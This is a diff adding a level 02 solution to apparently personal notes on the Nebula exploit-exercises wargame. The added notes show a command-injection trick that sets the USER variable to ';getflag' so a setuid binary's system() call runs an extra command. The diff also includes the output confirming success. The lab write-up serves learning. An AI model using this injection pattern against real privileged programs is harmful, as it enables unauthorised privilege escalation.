@@ -5,6 +5,18 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 02
+--------
+
+##### inject getflag call into USER var env and execute suid flag02 binary
+```bash
+level02@nebula:~$ USER=";getflag"; /home/flag02/flag02 
+about to call system("/bin/echo ;getflag is cool")
+
+You have successfully executed getflag on a target account
+```
+
+
 level 03
 --------
 
